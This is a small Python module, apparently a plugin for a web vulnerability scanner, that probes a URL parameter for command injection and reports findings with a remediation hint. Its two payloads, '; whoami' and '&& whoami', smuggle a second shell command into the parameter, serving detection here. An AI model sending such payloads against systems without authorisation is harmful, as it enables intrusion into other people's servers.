from core.analyzer import ResponseAnalyzer

payloads = [
    "; whoami",
    "&& whoami"
]


def run(client, url, param, reporter):
    baseline = client.send(url, params={param: "127.0.0.1"}).text

    for payload in payloads:
        res = client.send(url, params={param: payload}).text

        if ResponseAnalyzer.contains_keywords(res, ["root", "www-data"]) or \
           ResponseAnalyzer.is_different(baseline, res):

            print(f"[CMDi] {param} vulnerable")

            reporter.add(
                "Command Injection",
                param,
                payload,
                "HIGH",
                "Validate input and avoid system calls"
            )